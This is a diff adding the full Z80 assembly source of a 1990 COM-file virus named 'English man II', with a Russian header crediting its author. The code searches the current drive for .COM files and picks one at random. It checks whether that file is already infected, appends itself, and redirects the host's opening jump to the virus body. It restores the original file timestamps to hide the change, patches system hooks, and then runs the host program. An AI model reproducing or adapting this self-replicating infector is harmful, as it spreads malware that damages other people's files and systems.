@@ -1,0 +1,334 @@
+;+---------------------------------+
+;!*********************************!
+;!*                               *!
+;!*     Вирус  'Англичанин II'    *!
+;!*                               *!
+;!*       для  COM-файлов.        *!
+;!*                               *!
+;!*                               *!
+;!*   Создал:  Алексей из ОМСКА   *!
+;!*                               *!
+;!*              15.03.1990 г.    *!
+;!*                               *!
+;!*********************************!
+;+---------------------------------+
+;
+         org     #100
+;
+;
+BDOS	equ	#0005
+DATA	equ	#FA20
+DTA	equ	DATA+8
+FCB	equ	DTA+40	
+FCB2	equ	FCB+40
+LONG	equ	FCB+#10
+LONG1	equ	FCB2+#10
+FPOS	equ	FCB+#0C
+RECSIZ	equ	FCB+#0E
+FWRIT	equ	FCB+#21
+BUFST	equ	#FD90
+IN_OUT	equ	#4010
+CURDRV	equ	#F2C4
+DATE	equ	DATA+4
+TIME	equ	DATA+6
+FILES	equ	#FE7B
+STEK	equ	#FAF0
+;
+TIMIN	equ	#FD9A
+BLSTART	equ	#FD9B
+KEYRUS	equ	#FCAC
+;
+START	jp	VSTART
+	ld	c,9
+	ld	de,MESSAGE
+	call	BDOS
+	ret
+MESSAGE	defm	"Virus 'English man II' ver 1.0  1990y."
+	defb	#0A,#0D
+	defm	"Be Careful !$"
+;
+;
+VSTART	ld	(BUFST),sp
+	ld	(BUFST+2),a
+	ld	(BUFST+3),hl
+	ld	(BUFST+5),bc
+	ld	(BUFST+7),de
+;
+;push all
+;
+	ld	hl,(START+1)
+	ld	(DATA),hl
+;
+	ld	hl,0000
+;
+	ld	(START+1),hl
+;
+	ld	a,00
+;
+	ld	(START),a
+;---------------------------------
+;
+	ld 	sp,STEK
+;
+;стек под файлом
+;
+	ld	a,(CURDRV)
+	cp	3
+	jr	z,OBJ8
+	ld	a,(#F247)
+	ld	bc,#1F9
+	ld	de,#59F
+	ld	hl,(FILES+2)
+	push	hl
+	ld	hl,IN_OUT
+	ld	(FILES+2),hl
+	scf
+	call	FILES
+	pop	hl
+	ld	(FILES+2),hl
+;
+	jr	C,EXIT5
+;
+;write protect ?
+;
+OBJ8	ld	de,DTA
+	ld	c,#1A
+	call	BDOS
+;
+	ld	hl,FCB
+	ld	de,FCB+1
+	ld	a,0
+	ld	(hl),a
+	ld	bc,78
+	ldir
+;
+	ld	hl,FCB+1
+	ld	a,"?"
+	ld	(hl),a
+	ld	de,FCB+2
+	ld	bc,7
+	ldir
+;
+	ld	a,"C"
+	inc	hl
+	ld	(hl),a
+	ld	a,"O"
+	inc	hl
+	ld	(hl),a
+	inc	hl	
+	ld	a,"M"
+	ld	(hl),a
+;
+	ld	a,(CURDRV)
+	ld	(FCB),a
+;
+;
+	ld	a,r
+	and	#0F
+;
+	ld	(BUFST+9),a
+;
+	ld	c,#11
+	ld	de,FCB
+	call	BDOS
+	jr	SEARCH
+EXIT5	jr	EXIT1
+;
+SEARCH	jr	nz,EXIT1
+	ld	a,(BUFST+9)
+	cp	0
+	jr	z,PROW
+	dec	a
+	ld	(BUFST+9),a
+	jr	NEXT
+;
+PROW	ld	hl,DTA
+	ld	bc,32
+	ld	de,FCB2
+	ldir
+;
+	ld	a,(FCB)
+	ld	(FCB2),a
+;
+	ld	c,#0F
+	ld	de,FCB2
+	call	BDOS
+;
+	ld	hl,(LONG1)
+	ld	a,h
+	cp	3
+	jr	c,EXIT1
+;
+	ld	hl,1
+	ld	(RECSIZ+40),hl
+	ld	hl,0
+	ld	(FPOS+40),hl
+	ld	(FWRIT+40),hl
+;
+        ld	hl,(FCB+21)
+	ld	(DATE),hl
+	ld	hl,(FCB+23)
+	ld	(TIME),hl
+;
+	jr	OBJ4
+NEXT	ld	c,#12
+	ld	de,FCB
+	call	BDOS
+	or	a
+	jr	SEARCH
+;
+OBJ4	ld	c,#27
+	ld	de,FCB2
+	ld	hl,0003
+	call	BDOS
+	jr	z,OBJ1
+EXIT1	jr	EXIT4
+OBJ1	ld	a,(DTA)
+	cp	#C3
+	jr	nz,NOT_VIR
+	ld	hl,(DTA+1)
+	ld	bc,#100
+	sbc	hl,bc
+	ld	(FPOS+40),hl
+	ld	(FWRIT+40),hl
+	ld	c,#27
+	ld	hl,3
+	ld	de,FCB2
+	call	BDOS
+	ld	hl,DTA
+	ld	a,(hl)
+	cp	#ED
+	jr	nz,NOT_VIR
+	inc	hl
+	ld	a,(hl)
+	cp	#73
+	jr	nz,NOT_VIR
+	inc	hl
+	ld	a,(hl)
+	cp	#90
+	jr	nz,NOT_VIR
+;
+	ld	hl,(DATE)
+	ld	(FCB+21),hl
+	ld	hl,(TIME)
+	ld	(FCB+23),hl
+	ld	c,#10
+	ld	de,FCB2
+	call	BDOS
+EXIT4	jr	EXIT2
+;
+NOT_VIR	ld	hl,FCB2
+	ld	de,FCB
+	ld	bc,40
+	ldir
+;
+	ld	hl,(LONG)
+	ld	bc,#101
+	add	hl,bc
+	ld	(DATA+2),hl
+; 
+;DATA+2 = VSTART
+;
+	ld	hl,0
+	ld      (FPOS),hl
+	ld	(FWRIT),hl
+;
+	ld	c,#27
+	ld	hl,3
+	ld	de,FCB
+	call	BDOS
+;
+	ld	hl,(DATA)
+	ld	bc,#19
+;---------------------------
+	add	hl,bc
+	ld	de,(DTA+1)
+	ld	(hl),e
+	inc	hl
+	ld	(hl),d
+;--------------------------
+	ld	bc,5
+	ld	a,(DTA)
+	add	hl,bc
+	ld	(hl),a
+;--------------------------
+	ld	a,#C3
+	ld	(DTA),a
+	ld	hl,(DATA+2)
+	ld	(DTA+1),hl
+;
+	ld	hl,0
+	ld	(FPOS),hl
+	ld	(FWRIT),hl
+;
+	ld	hl,3
+	ld	c,#26
+	ld	de,FCB
+	call	BDOS
+	jr	z,OBJ2
+EXIT2	jr	EXIT7
+OBJ2	ld	de,(DATA)
+	ld	c,#1A
+	call	BDOS
+	ld	bc,KON-VSTART+1
+	ld	hl,(LONG)
+	add	hl,bc
+;
+	ld	hl,(DATA+2)
+	ld	bc,#100
+	sbc	hl,bc
+	ld	(FPOS),hl
+	ld	(FWRIT),hl
+;
+	ld	hl,KON-VSTART+1
+	ld	c,#26
+	ld	de,FCB
+	call	BDOS
+	jr	nz,EXIT3
+	jr	BREAK
+EXIT7	jr	EXIT3
+;
+;------------------------------
+;
+BREAK  	ld	c,#10
+	ld	de,FCB
+	ld	hl,(DATE)
+	ld	(FCB+21),hl
+	ld	hl,(TIME)
+	ld	(FCB+23),hl
+	call	BDOS
+;
+;------------------------------
+EXIT3	ld	a,#C9
+	ld	(TIMIN),a
+	ld	hl,(DATA)
+	ld	bc,NBR-VSTART+1
+	add	hl,bc
+	ld	bc,KBR-NBR
+	ld	de,BLSTART
+	ldir	
+	ld	a,#AF		;Xor a
+	ld	(TIMIN),a
+;------------------------------
+	ld	c,#10
+	ld	de,FCB
+	ld	hl,(DATE)
+	ld	(FCB+21),hl
+	ld	hl,(TIME)
+	ld	(FCB+23),hl
+	call	BDOS
+
+;
+  	ld	a,(BUFST+2)
+	ld	hl,(BUFST+3)
+	ld	bc,(BUFST+5)
+	ld	de,(BUFST+7)
+	ld	sp,(BUFST)
+	jp	START
+;
+NBR	xor	a
+	ld	(KEYRUS),a
+KBR	ret
+;
+KON	nop
+
